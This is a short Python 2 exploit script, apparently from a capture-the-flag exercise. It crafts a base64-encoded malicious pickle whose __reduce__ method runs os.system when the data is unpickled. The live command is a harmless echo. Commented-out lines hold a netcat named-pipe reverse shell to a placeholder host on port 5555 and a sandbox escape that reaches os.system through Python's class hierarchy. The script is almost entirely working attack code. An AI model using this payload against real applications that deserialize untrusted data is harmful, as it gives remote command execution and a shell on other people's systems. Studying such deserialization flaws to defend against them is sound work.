#!/usr/bin/env python2

import pickle
import os
import base64

pic = "KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu"

original = pickle.loads(base64.b64decode(pic))

class payload(object):
    def __reduce__(self):
       # comm = "rm /tmp/shell; mknod /tmp/shell p; nc x.x.x.x 5555 0</tmp/shell | /bin/sh 1>/tmp/shell"
       comm = "/bin/echo admin"
       return (os.system, (comm,))

# comm = "rm /tmp/shell; mknod /tmp/shell p; nc x.x.x.x 5555 0</tmp/shell | /bin/sh 1>/tmp/shell"
# classes = {}.__class__.__base__.__subclasses__()
# test = classes[59]()._module.__builtins__['__import__']("os").system(comm)
# original['user'] = "admin"
original['user'] = payload()
test = base64.b64encode(pickle.dumps(original))
print test
# print pickle.loads(base64.b64decode(test))
